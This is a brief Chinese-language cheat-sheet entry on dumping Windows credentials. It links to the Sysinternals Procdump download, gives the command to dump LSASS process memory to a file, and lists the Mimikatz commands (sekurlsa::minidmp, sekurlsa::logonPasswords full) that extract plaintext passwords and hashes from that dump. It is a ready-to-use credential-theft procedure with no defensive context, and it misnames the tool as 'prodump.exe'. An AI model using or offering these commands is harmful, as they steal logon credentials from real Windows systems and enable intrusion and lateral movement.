## Mimikatz结合Prodump 获取内存密码
 
 `Prodump下载地址:https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump`
 
    prodump.exe -accepteula -ma lsass.exe lsass.dmp
    
    把lsass.dmp放到mimikatz目录下
    
    sekurlsa::minidmp lsass.dmp和sekurlsa::logonPasswords full
